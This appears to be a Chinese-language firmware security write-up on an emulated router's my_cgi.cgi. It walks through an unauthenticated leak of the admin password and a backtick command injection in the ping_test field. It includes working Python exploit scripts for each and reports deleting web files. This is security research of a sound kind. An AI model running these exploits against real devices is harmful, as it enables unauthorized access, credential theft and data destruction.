# 基础分析
binwalk看一下固件的基础信息
![[54a79d4c243dfb510d4f1c90272d1df.png]]
得知固件是mips的小端序，文件系统为squashfs，再binwalk -Me 解压这个固件
先用FirmAE 调试模式模拟这个固件，选2进入这个固件的shell模式
![[Pasted image 20240727190040.png]]
firmwalker-pro-max信息
![[Pasted image 20240727213845.png]]
这里告诉了我们固件的初始密码（这是没有设置初始密码的时候）
# 敏感信息泄露漏洞
用burp自带的浏览器打开192.168.0.1，发现需要密码登录
![[Pasted image 20240727190217.png]]
## 思路一
此时我们也不知道密码是什么，于是想着随便输一串密码，用burp抓个包看看能不能或许到什么信息
看到抓到了四个POST请求的包，且都返回了200
![[Pasted image 20240727190700.png]]
我们从第一个开始一个一个点进去看一下
![[Pasted image 20240727190927.png]]
我们发现，"no-auth"没有认证字样，且table_name的参数信息都打印在了返回包中，那么我们猜测：是不是我们在没有认证的情况下，把table_name的参数改成我们想要的用户名和密码就能得到账户和密码信息呢，如果是的话这就是个信息泄露的漏洞点了，带着猜测我们接着看下面的抓包内容
![[Pasted image 20240727191556.png]]
我们发现同样是请求的my_cgi.cgi，但是request的参数变成了login，且出现了admin_user_name 和 admin_user_pwd可疑字样，结合之前的table_name，这里我们猜测是不是把table_name里面的参数改成admin_user_name 和 admin_user_pwd就可以在返回包打印出来呢？尝试一下
在此之前我们决定再看一下后面两个请求包，发现只要是请求了my_cgi.cgi，且request=no_auth，table_name参数的信息就会被返回包所打印出来
![[Pasted image 20240727192053.png]]
那么我们随便拿其中一个请求包，把table_name中的参数改为我们想要的admin_user_name 和 admin_user_pwd其余信息不变
![[Pasted image 20240727192505.png]]
这里发现并没有返回出来打印信息，这里怀疑参数名字可能不对，于是去找my_cgi.cgi这个二进制文件分析一下
![[Pasted image 20240727192830.png]]
找到在/usr/bin下面，checksec一下发现没有什么保护，拿出来放到IDA里分析一下
进到IDA里，我们直接去搜了一下关键字admin_user_name 和 admin_user_pwd
![[Pasted image 20240727193134.png]]
只找到了这一处，点进去看一下交叉引用到哪里了
![[Pasted image 20240727193535.png]]
第二个交叉引用点，我们结合burp抓到的返回包是有打印什么信息的，而第二个没有打印操作，所以我们暂不分析，而第一个交叉引用点有打印信息的操作，我们先分析一下它都打印了什么，与抓到的包作个对比
![[Pasted image 20240727194027.png]]
经过分析后，它是将"OK"或者"ERROR"打印出来，那么我们所抓到的包并没有是返回这两个字符的
那么我们再想，既然有回显，那么我们去找回显出来的关键字，比如hw_ver
![[Pasted image 20240727195634.png]]
![[Pasted image 20240727195647.png]]
我们交叉引用到了load_settings这个函数中，我们往回看load_settings这不就是第二个request的参数嘛，那么我们思考，要想打印出来table_name参数信息，load_settings这个参数不能少
load_settings这个函数主要是对比各个字符串，然后再打印其信息，也就是说，table_name传什么参数，它就会打印哪个参数的信息
![[Pasted image 20240727200839.png]]
这里也发现了个图片验证码的信息，只要把table_name的参数改为create_auth_pic即可获得验证码
![[Pasted image 20240727203159.png]]
那么我们接下来就该找密码的参数到底是怎么定义的了
我们接着追溯一下load_settings这个函数的上层引用，一直追溯到main函数中
![[Pasted image 20240727203312.png]]
至此我们找到了这两个参数信息，我们尝试把table_name的参数改为这俩个，看看能不能打印出来什么有用信息
![[Pasted image 20240727203531.png]]
至此我们找到了当是admin的时候，admin_level=1，admin_user_pwd=admin123456，当是user的时候，user_level=0,user_user_pwd= ，这时看来确实是敏感信息泄露漏洞。
![[Pasted image 20240727204437.png]]
果然登录成功了
## EXP
```
import requests

ip = "192.168.0.1:80"
payload = "admin_user"

url = "http://"+ip+"/my_cgi.cgi"
Headers = {"Referer": "http://"+ip+"/login_real.htm"}
Data = "request=no_auth&request=load_settings&table_name="+payload+""
response = requests.post(url, headers=Headers, data=Data)
print(response.text)
```

# 命令执行漏洞
看到ping的框，DNA在动，尝试先正常输入一个ip会显示什么
![[Pasted image 20240728003513.png]]
那么再看一下输入带命令的会怎么样
![[Pasted image 20240728003659.png]]
这里可以知道，并不会在界面上有回显，0表示success，2表示unknown host
我们看一下shell模式里的www/下面有没有aaa.htm这个文件
![[Pasted image 20240728004028.png]]
发现确实存在但是没内容，难道没有写的权限嘛？
![[Pasted image 20240728004618.png]]
看了一下IDA关于这里的伪代码，发现好像也没什么过滤，只是执行了命令后写到了/tmp/ping_result里面，再读这个文件查看有没有执行结果，最后会删掉这个临时文件
![[Pasted image 20240728135552.png]]
这时候请出我们的老演员反双引号和 $()
![[Pasted image 20240728004707.png]]
显示成功了，去shell看一下有没有内容
![[Pasted image 20240728004807.png]]
很遗憾这次的$()返回了2，并没有写进去
再lighttpd找了一下有没有什么规则，好像并没有什么规则，于是试了一下.txt能不能打开，发现也可以在web端访问
![[Pasted image 20240728011854.png]]

## EXP
```
import requests

ip = "192.168.0.1"
payload = "`ps>aaa.htm`"

url = "http://"+ip+"/my_cgi.cgi"
Headers = {"Referer": "http://"+ip+"/tools_vct.htm"}
Data = "request=ping_test&ip_addr="+payload+""
requests.post(url, headers=Headers, data=Data)

url1 = "http://"+ip+"/aaa.htm"
response = requests.get(url1)
print(response.text)
```

# 未授权
根据之前的敏感信息泄露以及命令执行相结合来看，猜测只要request的参数有no_auth，那么就做到了未授权
直接测试一下，在不登陆的状态下，在命令执行的exp中的Data加上request=no_auth
```
import requests

ip = "192.168.0.1"
payload = "`ps>aaa.htm`"

url = "http://"+ip+"/my_cgi.cgi"
Headers = {"Referer": "http://"+ip+"/tools_vct.htm"}
Data = "request=no_auth&request=ping_test&ip_addr="+payload+""
requests.post(url, headers=Headers, data=Data)

url1 = "http://"+ip+"/aaa.htm"
response = requests.get(url1)
print(response.text)
```
![[Pasted image 20240728013516.png]]
发现执行成功了，那么也验证了我们的猜想
那么既然未授权了，岂不是想干嘛就干嘛想看什么就看什么嘛
那么只要把命令改为ls -R /那么就做到了未授权目录遍历的操作了（截取部分内容）
![[Pasted image 20240728014027.png]]

## EXP
```
import requests

ip = "192.168.0.1"
payload = "`ls -R />aaa.htm`"

url = "http://"+ip+"/my_cgi.cgi"
Headers = {"Referer": "http://"+ip+"/tools_vct.htm"}
Data = "request=no_auth&request=ping_test&ip_addr="+payload+""
requests.post(url, headers=Headers, data=Data)

url1 = "http://"+ip+"/aaa.htm"
response = requests.get(url1)
print(response.text)
```


# Tips：
身份绕过和未授权绕过有什么区别？
**身份绕过**: 攻击者绕过身份验证机制，伪装成合法用户进入系统。
**未授权绕过**: 攻击者绕过授权机制，访问或操作他们不被允许的资源或功能。
那么由此可以确认上述确实是个未授权漏洞，执行完exp_test.py后，/www下的所有文件确实都被删除了
![[Pasted image 20240728020454.png]]

# CVE
![[Pasted image 20240728021431.png]]
![[Pasted image 20240728021518.png]]
